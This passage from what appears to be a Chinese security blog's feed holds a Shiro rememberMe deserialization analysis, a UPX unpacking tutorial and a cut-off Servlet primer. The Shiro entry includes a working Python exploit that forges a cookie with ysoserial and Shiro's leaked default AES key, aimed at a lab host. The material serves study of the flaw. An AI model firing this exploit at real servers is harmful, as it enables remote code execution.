class="hljs-selector-class">.AbstractRememberMeManager</span><span class="hljs-selector-id">#rememberIdentity</span><br>调用<span class="hljs-selector-tag">convertPrincipalsToBytes</span>和<span class="hljs-selector-tag">rememberSerializedIdentity</span><br><br>3<span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.mgt</span><span class="hljs-selector-class">.AbstractRememberMeManager</span><span class="hljs-selector-id">#convertPrincipalsToBytes</span><br>序列化用户名并用硬编码<span class="hljs-selector-tag">key</span>进行<span class="hljs-selector-tag">AES</span>加密<br><br>4<span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.mgt</span><span class="hljs-selector-class">.CookieRememberMeManager</span><span class="hljs-selector-id">#rememberSerializedIdentity</span><br>把加密过的数据<span class="hljs-selector-tag">base64</span>编码后写入<span class="hljs-selector-tag">cookie</span><br></code></pre></td></tr></table></figure><h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p>根据加密过程可以知道，解密过程一定经过了base64解码、AES解密、反序列化这几个步骤，接下来详细分析这几个步骤的执行过程，并找到反序列化点</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">readValue</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">getRememberedSerializedIdentity</span> base64docode-&gt;</span>convertBytesToP<br></code></pre></td></tr></table></figure><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code></p><p>在<code>decrypt</code>方法这里下一个断点</p><p>调用栈</p><p><a href="https://imgtu.com/i/2VwY11"><img src="https://z3.ax1x.com/2021/05/30/2VwY11.png" alt="2VwY11.png"></a></p><p><code>org.apache.shiro.mgt.DefaultSecurityManager#resolvePrincipals</code></p><p>作用是调用<code>getRememberedIdentity</code></p><p><a href="https://imgtu.com/i/2VwNX6"><img src="https://z3.ax1x.com/2021/05/30/2VwNX6.png" alt="2VwNX6.png"></a></p><p><code>org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity</code></p><p>作用是调用<code>getRememberedPrincipals</code></p><p><a href="https://imgtu.com/i/2Vww7D"><img src="https://z3.ax1x.com/2021/05/30/2Vww7D.png" alt="2Vww7D.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code></p><p>分别调用了<code>getRememberedSerializedIdentity</code>和<code>convertBytesToPrincipals</code>，前者对cookie进行base64解码，后者进行AES解密和反序列化。</p><p><a href="https://imgtu.com/i/2Vwd0O"><img src="https://z3.ax1x.com/2021/05/30/2Vwd0O.png" alt="2Vwd0O.png"></a></p><h2 id="base64解码"><a href="#base64解码" class="headerlink" title="base64解码"></a>base64解码</h2><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code></p><p>这里出现了读取cookie的操作</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">String base64 = this.get<span class="hljs-constructor">Cookie()</span>.read<span class="hljs-constructor">Value(<span class="hljs-params">request</span>, <span class="hljs-params">response</span>)</span>;<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2Vwrhd"><img src="https://z3.ax1x.com/2021/05/30/2Vwrhd.png" alt="2Vwrhd.png"></a></p><p><code>org.apache.shiro.web.servlet.SimpleCookie.readValue</code></p><p>getName()返回<code>rememberMe</code>，最终返回cookie中remeberMe的值</p><p><a href="https://imgtu.com/i/2VwDtH"><img src="https://z3.ax1x.com/2021/05/30/2VwDtH.png" alt="2VwDtH.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code></p><p>调用<code>decrypt</code>和<code>deserialize</code>，进行AES解密和反序列化操作</p><p><a href="https://imgtu.com/i/2VwBAe"><img src="https://z3.ax1x.com/2021/05/30/2VwBAe.png" alt="2VwBAe.png"></a></p><h2 id="AES解密"><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h2><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code></p><p>进行解密，<code>getCipherService()</code>获取加密方法<code>AES/CBC/PKCS5Padding</code></p><p><a href="https://imgtu.com/i/2Vw61I"><img src="https://z3.ax1x.com/2021/05/30/2Vw61I.png" alt="2Vw61I.png"></a></p><p><code>org.apache.shiro.cryoti.JcaCipherService#decrypt</code></p><p>继续进入<code>decrypt</code></p><p><a href="https://imgtu.com/i/2VwRnf"><img src="https://z3.ax1x.com/2021/05/30/2VwRnf.png" alt="2VwRnf.png"></a></p><p><code>org.apache.shiro.cryoti.JcaCipherService#decrypt</code></p><p>接下来进入<code>crypt</code></p><p><a href="https://imgtu.com/i/2Vwcct"><img src="https://z3.ax1x.com/2021/05/30/2Vwcct.png" alt="2Vwcct.png"></a></p><p><code>org.apache.shiro.cryoti.JcaCipherService#crypt</code></p><p>到这里已经基本完成解密，接下来就是反序列化操作了</p><p><a href="https://imgtu.com/i/2VwgjP"><img src="https://z3.ax1x.com/2021/05/30/2VwgjP.png" alt="2VwgjP.png"></a></p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals</code></p><p>回到上面的<code>convertBytesToPrincipals</code>，继续进入<code>deserialize</code>进行反序列化</p><p><a href="https://imgtu.com/i/2VwWB8"><img src="https://z3.ax1x.com/2021/05/30/2VwWB8.png" alt="2VwWB8.png"></a></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</code></p><p>调用<code>deserialize</code></p><p><a href="https://imgtu.com/i/2VwfHS"><img src="https://z3.ax1x.com/2021/05/30/2VwfHS.png" alt="2VwfHS.png"></a></p><p><code>org.apache.shiro.io.DefaultSerializer#deserialize</code></p><p>出现readObject，将输入参数进行反序列化</p><p><a href="https://imgtu.com/i/2Vw5NQ"><img src="https://z3.ax1x.com/2021/05/30/2Vw5NQ.png" alt="2Vw5NQ.png"></a></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>cookie base64解码 AES解密 反序列化</p><p>主要执行流程</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">1<span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.mgt</span><span class="hljs-selector-class">.AbstractRememberMeManager</span><span class="hljs-selector-id">#getRememberedPrincipals</span><br>调用<span class="hljs-selector-tag">getRememberedSerializedIdentity</span>方法和<span class="hljs-selector-tag">convertBytesToPrincipals</span><br>2<span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.web</span><span class="hljs-selector-class">.mgt</span><span class="hljs-selector-class">.CookieRememberMeManager</span><span class="hljs-selector-id">#getRememberedSerializedIdentity</span><br><span class="hljs-selector-tag">base64</span>解码<br>3<span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.mgt</span><span class="hljs-selector-class">.AbstractRememberMeManager</span><span class="hljs-selector-id">#decrypt</span><br>进行<span class="hljs-selector-tag">AES</span>解密<br>4<span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.shiro</span><span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.DefaultSerializer</span><span class="hljs-selector-id">#deserialize</span><br>进行反序列化<br></code></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>参考链接里的exp，Demo选择的Gadget是CommonsCollections2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode_rememberme</span>(<span class="hljs-params">command</span>):</span><br>    <span class="hljs-comment"># 这里使用CommonsCollections2模块</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;CommonsCollections2&#x27;</span>, command], stdout=subprocess.PIPE)<br>    <span class="hljs-comment"># 明文需要按一定长度对齐，叫做块大小BlockSize 这个块大小是 block_size = 16 字节</span><br>    BS = AES.block_size<br>    <span class="hljs-comment"># 按照加密规则按一定长度对齐,如果不够要要做填充对齐</span><br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    <span class="hljs-comment"># 泄露的key</span><br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    <span class="hljs-comment"># AES的CBC加密模式</span><br>    mode = AES.MODE_CBC<br>    <span class="hljs-comment"># 使用uuid4基于随机数模块生成16字节的 iv向量</span><br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    <span class="hljs-comment"># 实例化一个加密方式为上述的对象</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    <span class="hljs-comment"># 用pad函数去处理yso的命令输出，生成的序列化数据</span><br>    file_body = pad(popen.stdout.read())<br>    <span class="hljs-comment"># iv 与 （序列化的AES加密后的数据）拼接， 最终输出生成rememberMe参数</span><br>    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))<br><br>    <span class="hljs-keyword">return</span> base64_rememberMe_value<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># cc2的exp</span><br>    payload = encode_rememberme(<span class="hljs-string">&#x27;calc&#x27;</span>)<br>    print(<span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br><br>    cookie = &#123;<br>        <span class="hljs-string">&quot;rememberMe&quot;</span>: payload.decode()<br>    &#125;<br><br>    requests.get(url=<span class="hljs-string">&quot;http://192.168.199.152:8080/web_war/&quot;</span>, cookies=cookie)<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2VwT9s"><img src="https://z3.ax1x.com/2021/05/30/2VwT9s.png" alt="2VwT9s.png"></a></p><p>弹出计算器</p><p><a href="https://imgtu.com/i/2Vw73n"><img src="https://z3.ax1x.com/2021/05/30/2Vw73n.png" alt="2Vw73n.png"></a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/">http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/</a></p><p><a href="https://blog.csdn.net/god_zzZ/article/details/108391075">https://blog.csdn.net/god_zzZ/article/details/108391075</a></p><p><a href="https://www.anquanke.com/post/id/225442#h3-6">https://www.anquanke.com/post/id/225442#h3-6</a></p><p><a href="https://xz.aliyun.com/t/8997#toc-3">https://xz.aliyun.com/t/8997#toc-3</a></p><p><a href="https://www.freebuf.com/vuls/264079.html">https://www.freebuf.com/vuls/264079.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ESP定律和动态脱UPX壳</title>
    <link href="/2021/05/28/ESP%E5%AE%9A%E5%BE%8B%E5%92%8C%E5%8A%A8%E6%80%81%E8%84%B1UPX%E5%A3%B3/"/>
    <url>/2021/05/28/ESP%E5%AE%9A%E5%BE%8B%E5%92%8C%E5%8A%A8%E6%80%81%E8%84%B1UPX%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="关于ESP定律"><a href="#关于ESP定律" class="headerlink" title="关于ESP定律"></a>关于ESP定律</h1><p>简单来说，给栈顶ESP下硬件断点，ESP被拿走的时候就会停住，而在ESP上面push值或者pop值都不会停住</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">S:</span>Stack栈<br><span class="hljs-symbol">P:</span>Pointer指针<br></code></pre></td></tr></table></figure><p>注意栈底部大上面小，SP是栈顶指针，一有羽毛球进去就会减少4个大小</p><p><a href="https://imgtu.com/i/2FnutA"><img src="https://z3.ax1x.com/2021/05/28/2FnutA.png" alt="2FnutA.png"></a></p><p>先放了一个球进栈，ESP值由开始的<code>0012FFC4</code>减去4变成了<code>0012FFC0</code></p><p><a href="https://imgtu.com/i/2Fnnkd"><img src="https://z3.ax1x.com/2021/05/28/2Fnnkd.png" alt="2Fnnkd.png"></a></p><p>再放一个ESP又减去4</p><p><a href="https://imgtu.com/i/2FneTH"><img src="https://z3.ax1x.com/2021/05/28/2FneTH.png" alt="2FneTH.png"></a></p><p>所有的步骤执行完，ESP变成了<code>0012FFA4</code></p><p><a href="https://imgtu.com/i/2FnVmD"><img src="https://z3.ax1x.com/2021/05/28/2FnVmD.png" alt="2FnVmD.png"></a></p><p>现在正式开始ESP定律</p><p>在<code>0012FFA4</code>下一个硬件访问断点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">端点：就是运行到这个地方暂停<br>访问断电：再次访问0012FFA4这个地址就停下来<br>硬件访问端点：可以设置在任何位置上（普通软件断点可以用于内存，堆栈上。要记住）<br></code></pre></td></tr></table></figure><p>下列语句执行完后</p><p><a href="https://imgtu.com/i/2FnKfI"><img src="https://z3.ax1x.com/2021/05/28/2FnKfI.png" alt="2FnKfI.png"></a></p><p>上面语句执行完后，结果如下</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">访问断点：0012FFA4 <span class="hljs-keyword">EDI</span>这个羽毛球不在桶里的时候，一改变就停止<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/2FnZ0e"><img src="https://z3.ax1x.com/2021/05/28/2FnZ0e.png" alt="2FnZ0e.png"></a></p><p>现在给<code>0012FFAC</code>处下了硬件访问断点，研究一下怎么才会停下</p><p>这两种都不会停下</p><p>在栈顶<code>0012FFAC</code>上面加了两个新的羽毛球</p><p><a href="https://imgtu.com/i/2FnY7Q"><img src="https://z3.ax1x.com/2021/05/28/2FnY7Q.png" alt="2FnY7Q.png"></a></p><p>又把刚才加的两个拿走了，也没有影响</p><p><a href="https://imgtu.com/i/2Fn3X8"><img src="https://z3.ax1x.com/2021/05/28/2Fn3X8.png" alt="2Fn3X8.png"></a></p><p>这个才会停下，一定要把<code>0012FFAC</code>位置上的给拿走了（pop），才会停住</p><p><a href="https://imgtu.com/i/2FnUts"><img src="https://z3.ax1x.com/2021/05/28/2FnUts.png" alt="2FnUts.png"></a></p><h2 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">简单来说：<br>程序<span class="hljs-number">1</span>（解压代码）执行过程中往栈里先<span class="hljs-keyword">push</span>再<span class="hljs-keyword">pop</span>-&gt;执行结束后栈为空，真正代码开始执行，找到OEP<br></code></pre></td></tr></table></figure><p>upx加壳后的程序运行时会先加载upx加入的代码（我们叫它程序1），把压缩后的代码还原出来。程序1是一个完整的程序，作用是解码后面的代码</p><p><a href="https://imgtu.com/i/2FnQpt"><img src="https://z3.ax1x.com/2021/05/28/2FnQpt.png" alt="2FnQpt.png"></a></p><p>完整的程序什么时候结束？</p><p>当栈第一次回到初始状态的时候</p><p><a href="https://imgtu.com/i/2Fn16f"><img src="https://z3.ax1x.com/2021/05/28/2Fn16f.png" alt="2Fn16f.png"></a></p><p>没开始执行时栈是空的，程序开始执行后程序1入栈（想象push了很多值进栈）</p><p>现在栈还是空的，</p><p><a href="https://imgtu.com/i/2FnGnS"><img src="https://z3.ax1x.com/2021/05/28/2FnGnS.png" alt="2FnGnS.png"></a></p><p>程序1先入栈（push一些值进栈）</p><p><a href="https://imgtu.com/i/2FnJ0g"><img src="https://z3.ax1x.com/2021/05/28/2FnJ0g.png" alt="2FnJ0g.png"></a></p><p>程序1.1入栈（又push了一些值进栈）</p><p><a href="https://imgtu.com/i/2FnNkj"><img src="https://z3.ax1x.com/2021/05/28/2FnNkj.png" alt="2FnNkj.png"></a></p><p>接着程序1.1和程序1陆续出栈，栈空了，解压代码执行结束。</p><p>程序1也就是解压代码执行完后，栈返回初始空状态，这里就是程序真正开始的地方，也就是我们要找的<code>OEP</code></p><p><a href="https://imgtu.com/i/2Fnahn"><img src="https://z3.ax1x.com/2021/05/28/2Fnahn.png" alt="2Fnahn.png"></a></p><h2 id="ESP定律的变形用法"><a href="#ESP定律的变形用法" class="headerlink" title="ESP定律的变形用法"></a>ESP定律的变形用法</h2><p>初始状态的ESP地址为<code>0012FFC4</code>，在它的上一个地址<code>0012FFC0</code>下一个硬件访问断点</p><p><a href="https://imgtu.com/i/2Fnwpq"><img src="https://z3.ax1x.com/2021/05/28/2Fnwpq.png" alt="2Fnwpq.png"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">初始<span class="hljs-built_in">ESP</span>指向0012FFC4，upx加壳程序运行时先执行解压代码，解压代码会在栈里先<span class="hljs-keyword">pushad</span>再<span class="hljs-keyword">popad</span>，在解压代码执行完后栈空了，只要事先在0012FFC4的上面0012FFC0下一个硬件访问断点，这样<span class="hljs-keyword">popad</span>拿到初始<span class="hljs-built_in">ESP</span>的时候就停住了，<br></code></pre></td></tr></table></figure><h1 id="动态脱upx壳"><a href="#动态脱upx壳" class="headerlink" title="动态脱upx壳"></a>动态脱upx壳</h1><p>起点</p><p><a href="https://imgtu.com/i/2Fn010"><img src="https://z3.ax1x.com/2021/05/28/2Fn010.png" alt="2Fn010.png"></a></p><p>接下来按f8单步执行pushad指令，再设置硬件读取断点</p><p><a href="https://imgtu.com/i/2FnsnU"><img src="https://z3.ax1x.com/2021/05/28/2FnsnU.png" alt="2FnsnU.png"></a></p><p>设置完按f9运行程序，再次中断在一个不同的地址。这里并不是真实的程序代码，而是一个将栈空间向上清零0x80长度的循环。后面跟着一个向前的远距离的跳转（0043208C跳到00404DDC），这个就是跳到源代码的跳转（壳程序一般与程序原来的代码在不同的区段，故相隔较远）。</p><p><a href="https://imgtu.com/i/2Fnh1x"><img src="https://z3.ax1x.com/2021/05/28/2Fnh1x.png" alt="2Fnh1x.png"></a></p><p>接下来删除硬件断点，菜单栏选择<code>调试-&gt;硬件断点</code></p><p><a href="https://imgtu.com/i/2FnBcV"><img src="https://z3.ax1x.com/2021/05/28/2FnBcV.png" alt="2FnBcV.png"></a></p><p>把光标移动到这个jmp，按f4使得程序执行到光标处，再按f8执行跳转</p><p><a href="https://imgtu.com/i/2FnDXT"><img src="https://z3.ax1x.com/2021/05/28/2FnDXT.png" alt="2FnDXT.png"></a></p><p>跳转后出现了正常的函数开头和结尾，判断这个代码片段属于原程序</p><p>开头</p><p><a href="https://imgtu.com/i/2Fn674"><img src="https://z3.ax1x.com/2021/05/28/2Fn674.png" alt="2Fn674.png"></a></p><p>结尾</p><p><a href="https://imgtu.com/i/2FnyBF"><img src="https://z3.ax1x.com/2021/05/28/2FnyBF.png" alt="2FnyBF.png"></a></p><p>对程序进行Dump，在插件中选择脱壳程序</p><p><a href="https://imgtu.com/i/2FngAJ"><img src="https://z3.ax1x.com/2021/05/28/2FngAJ.png" alt="2FngAJ.png"></a></p><p>单击获取EIP作为OEP，再单击脱壳</p><p><a href="https://imgtu.com/i/2Fn2N9"><img src="https://z3.ax1x.com/2021/05/28/2Fn2N9.png" alt="2Fn2N9.png"></a></p><p>保存脱壳后的文件，然后用ida打开，可以看到被完全还原</p><p><a href="https://imgtu.com/i/2Fnf91"><img src="https://z3.ax1x.com/2021/05/28/2Fnf91.png" alt="2Fnf91.png"></a></p><p>运行正常</p><p><a href="https://imgtu.com/i/2FnRhR"><img src="https://z3.ax1x.com/2021/05/28/2FnRhR.png" alt="2FnRhR.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Servlet学习</title>
    <link href="/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>Servlet</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Java </span> Servlet（<span class="hljs-keyword">Java服务器小程序）是一个基于Java技术的Web组件，运行在服务器端，它由Servlet容器所管理，用于生成动态的内容。 </span> Servlet是平台独立的<span class="hljs-keyword">Java类，编写一个Servlet，实际上就是按照Servlet规范编写一个Java类。Servlet被编译为平台独立 </span>的字节码，可以被动态地加载到支持<span class="hljs-keyword">Java技术的Web服务器中运行。</span><br></code></pre></td></tr></table></figure><p>Servlet容器</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Servlet容器也叫做Servlet引擎，是Web服务器或应用程序服务器的一部分，用于在发送的请求和响应之上提供网络服务，解码基于  MIME的请求，格式化基于MIME的响应。Servlet没有main方法，不能独立运行，它必须被部署到Servlet容器中，由容器来实例化和调用  Servlet的方法（如<span class="hljs-keyword">do</span><span class="hljs-constructor">Get()</span>和<span class="hljs-keyword">do</span><span class="hljs-constructor">Post()</span>），Servlet容器在Servlet的生命周期内包容和管理Servlet。在JSP技术 推出后，管理和运行Servlet/JSP的容器也称为Web容器。<br></code></pre></td></tr></table></figure><p> Tomcat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">Tomcat是一个免费的开放源代码的Servlet容器。<br>Tomcat服务器接受客户请求并做出响应的过程如下，与上图类似：<br>1）客户端（通常都是浏览器）访问Web服务器，发送HTTP请求。 <br>2）Web服务器接收到请求后，传递给Servlet容器。 <br>3）Servlet容器加载Servlet，产生Servlet实例后，向其传递表示请求和响应的对象。 <br>4）Servlet实例使用请求对象得到客户端的请求信息，然后进行相应的处理。 <br>5）Servlet实例将处理结果通过响应对象发送回客户端，容器负责确保响应正确送出，同时将控制返回给Web服务器。<br></code></pre></td></tr></table></figure><h1 id="tomcat目录结构"><a href="#tomcat目录结构" class="headerlink" title="tomcat目录结构"></a>tomcat目录结构</h1><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs crystal">bin，用于存放Tomcat的各种配置文件，比如，web.xml、server.xml<br><span class="hljs-class"><span class="hljs-keyword">lib</span>，用于存放<span class="hljs-title">Tomcat</span>服务器，和所有<span class="hljs-title">Web</span>应用程序需要访问的<span class="hljs-title">JAR</span>文件</span><br>logs，用于存放Tomcat的日志文件<br>temp，用于存放Tomcat运行时，产生的临时文件<br>webapps，Web应用程序的主要发布目录，通常将要发布的应用程序放到这个目录下<br>work，Tomcat的工作目录，JSP编译生成的Servlet源文件，和字节码文件放在这个目录下<br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/60a9f8e30b43a.jpg"></p><h1 id="idea-tomcat部署过程"><a href="#idea-tomcat部署过程" class="headerlink" title="idea tomcat部署过程"></a>idea tomcat部署过程</h1><p><a href="https://blog.csdn.net/qq_28513801/article/details/92838236">https://blog.csdn.net/qq_28513801/article/details/92838236</a></p><h1 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h1><h2 id="什么是servlet"><a href="#什么是servlet" class="headerlink" title="什么是servlet?"></a>什么是servlet?</h2><p>本质上就是一个运行在web容器(web服务器中)的java类，tomcat是web容器中的一个。</p><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">用于处理用户的请求并作出响应<br></code></pre></td></tr></table></figure><p>servlet与普通的java程序的区别：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.本质上就是一个<span class="hljs-keyword">java类</span><br><span class="hljs-keyword">2.所有的servlet必须实现接口：Servlet</span><br><span class="hljs-keyword">3.运行Tomcat中，web容器中</span><br><span class="hljs-keyword">4.对用户的请求进行处理，并且做出响应</span><br></code></pre></td></tr></table></figure><p>编写步骤：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">1</span>.创建一个继承于HttpServlet的类（HttpServlet实现了Servlet接口）<br><span class="hljs-number">2</span>.重写doGet或doPost方法，分别用来处理浏览器提交的get或post请求<br><span class="hljs-number">3</span>.配置webapp/WEB<span class="hljs-literal">-INF</span>/web.<span class="hljs-keyword">xml</span> <span class="hljs-title">文件，配置Servlet</span> 的访问地址。<br></code></pre></td></tr></table></figure><h2 id="配置Servlet"><a href="#配置Servlet" class="headerlink" title="配置Servlet"></a>配置Servlet</h2><p>写好的Serlvet保存在src目录中</p><p><img src="https://www.hualigs.cn/image/60a9f8e6559d1.jpg"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myServlet;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>);<br>        PrintWriter writer=resp.getWriter();<br>        writer.println(<span class="hljs-string">&quot;&lt;h1 style=&#x27;color:red&#x27;&gt;11111&lt;/h1&gt;&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>在WEB-INF/web.xml中配置servlet-mapping和servlet-name</p><p><img src="https://www.hualigs.cn/image/60a9f8e47016d.jpg"></p><p>访问效果</p><p><img src="https://www.hualigs.cn/image/60a9f8e47bc5b.jpg"></p><h2 id="servlet生命周期"><a href="#servlet生命周期" class="headerlink" 